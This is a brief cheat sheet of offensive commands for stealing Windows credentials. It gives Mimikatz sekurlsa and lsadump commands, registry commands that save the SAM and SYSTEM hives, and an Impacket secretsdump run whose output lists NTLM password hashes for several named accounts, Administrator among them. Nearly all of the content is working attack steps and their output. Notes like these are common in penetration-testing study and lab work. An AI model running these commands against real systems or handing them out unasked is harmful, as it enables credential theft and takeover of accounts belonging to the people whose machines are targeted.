
## Mimikatz

```
privilege::debug
```
##### Logon-Sessions

```
sekurlsa::logonpasswords
```

```
sekurlsa::ekeys
sekurlsa::krbtgt
sekurlsa::dpapi
```
##### SAM

```
lsadump::sam
```

##### Specific SAM & SYSTEM Files

```
lsadump::sam /sam:C:Temp\SAM /system:C:\Temp\SYSTEM
```

---
##### Default Path for SAM & SYSTEM File

```
C:\Windows\System32\SAM
C:\Windows\System32\SYSTEM
```

##### How to retrieve from Registry

```
reg save hklm\sam c:\Temp\SAM
```

```
reg save hklm\system c:\Temp\SYSTEM
```

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
[*] Cleaning up..
```